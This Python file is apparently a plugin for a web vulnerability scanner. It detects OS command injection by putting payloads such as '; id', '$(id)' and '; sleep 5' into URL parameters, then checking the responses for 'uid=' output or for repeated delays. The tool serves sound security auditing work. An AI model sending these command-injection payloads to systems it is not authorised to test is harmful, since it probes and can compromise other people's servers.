"""Command injection detection with baseline timing and repeated validation."""

from __future__ import annotations

import logging
import statistics
import time
from collections.abc import AsyncIterator
from typing import TYPE_CHECKING
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from marlonthebug.http.client import AsyncHTTPClient
from marlonthebug.plugins.base import BasePlugin, Confidence, Finding, Severity

if TYPE_CHECKING:
    from marlonthebug.core.workspace import TargetInfo

logger = logging.getLogger("marlonthebug.plugins.web.command_injection")

CMD_PAYLOADS = ["; id", "| id", "$(id)", "`id`", "&& id", "|| id"]
TIME_PAYLOADS = ["; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)", "&& sleep 5"]
CMD_PARAMS = ["cmd", "exec", "command", "run", "shell", "ping", "host", "ip", "address", "domain"]
EDGE_STATUS = {520, 521, 522, 523, 524, 525, 526, 530}


class CommandInjectionAuditor(BasePlugin):
    name = "command_injection"
    version = "2.0.0"
    description = "Detecta command injection con baseline temporal, repetición y validación de salida"
    category = "web"
    cwe = "CWE-78"
    owasp = "A03:2021 Injection"

    async def run(self, target: TargetInfo, options: dict | None = None) -> AsyncIterator[Finding]:
        options = options or {}
        base_url = str(options.get("base_url") or f"https://{target.host}").rstrip("/")
        endpoints = list(options.get("endpoints") or [])
        http = AsyncHTTPClient(timeout=20, retries=1)
        reported: set[tuple[str, str]] = set()
        try:
            urls = [url for url in endpoints if "?" in url and "=" in url]
            for param in CMD_PARAMS:
                urls.append(f"{base_url}?{param}=test")
            for url in list(dict.fromkeys(urls))[:20]:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                if not params:
                    continue
                for param in list(params.keys())[:6]:
                    if param.lower() not in CMD_PARAMS or (url, param) in reported:
                        continue
                    baseline_url = _with_param(url, params, param, "test")
                    try:
                        baseline = await http.get(baseline_url)
                    except Exception:
                        continue
                    if _edge_error(baseline):
                        continue
                    baseline_body = baseline.body
                    # Measure normal latency twice before trusting a delay.
                    timings = []
                    for _ in range(2):
                        try:
                            started = time.monotonic()
                            await http.get(baseline_url)
                            timings.append(time.monotonic() - started)
                        except Exception:
                            break
                    baseline_time = statistics.mean(timings) if timings else 0.5

                    for payload in CMD_PAYLOADS:
                        test_url = _with_param(url, params, param, payload)
                        try:
                            response = await http.get(test_url)
                        except Exception:
                            continue
                        if _edge_error(response):
                            continue
                        for indicator in ("uid=", "gid=", "groups="):
                            if indicator in response.body and indicator not in baseline_body:
                                reported.add((url, param))
                                yield self.create_finding(
                                    title=f"Command injection en '{param}' — salida visible",
                                    description=(
                                        f"El parámetro '{param}' ejecuta comandos del sistema. "
                                        f"El payload {payload!r} devolvió '{indicator}'."
                                    ),
                                    severity=Severity.CRITICAL,
                                    cvss_score=9.8,
                                    cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                                    confidence=Confidence.HIGH,
                                    cwe="CWE-78",
                                    owasp="A03:2021 Injection",
                                    endpoint=url,
                                    target_host=target.host,
                                    evidence={
                                        "parameter": param,
                                        "payload": payload,
                                        "indicator": indicator,
                                        "test_url": test_url,
                                        "response_snippet": response.body[:600],
                                    },
                                    remediation=(
                                        "Evita invoke system()/shell; usa APIs del lenguaje, allowlists de "
                                        "comandos y ejecución con mínimo privilegio."
                                    ),
                                )
                                break
                        if (url, param) in reported:
                            break

                    if (url, param) in reported:
                        continue

                    for payload in TIME_PAYLOADS:
                        test_url = _with_param(url, params, param, payload)
                        try:
                            started = time.monotonic()
                            await http.get(test_url)
                            elapsed = time.monotonic() - started
                        except Exception:
                            continue
                        if elapsed < baseline_time + 4.0:
                            continue
                        try:
                            started = time.monotonic()
                            await http.get(test_url)
                            confirm = time.monotonic() - started
                        except Exception:
                            continue
                        if confirm < baseline_time + 3.5:
                            continue
                        reported.add((url, param))
                        yield self.create_finding(
                            title=f"Command injection time-based en '{param}'",
                            description=(
                                f"El parámetro '{param}' introduce un retraso reproducible de {confirm:.1f}s "
                                f"frente a un baseline de {baseline_time:.2f}s."
                            ),
                            severity=Severity.CRITICAL,
                            cvss_score=9.1,
                            cvss_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:H",
                            confidence=Confidence.HIGH,
                            cwe="CWE-78",
                            owasp="A03:2021 Injection",
                            endpoint=url,
                            target_host=target.host,
                            evidence={
                                "parameter": param,
                                "payload": payload,
                                "baseline_seconds": round(baseline_time, 2),
                                "delayed_seconds": round(confirm, 2),
                                "confirmed": True,
                            },
                            remediation="Evita ejecutar comandos del sistema con entrada del usuario.",
                        )
                        break
        finally:
            await http.close()


def _with_param(url: str, params: dict[str, list[str]], param: str, value: str) -> str:
    parsed = urlparse(url)
    test_params = {key: values[0] for key, values in params.items()}
    test_params[param] = value
    return urlunparse(parsed._replace(query=urlencode(test_params, doseq=True)))


def _edge_error(response) -> bool:
    return response.status_code in EDGE_STATUS or "ssl handshake failed" in response.body.lower()
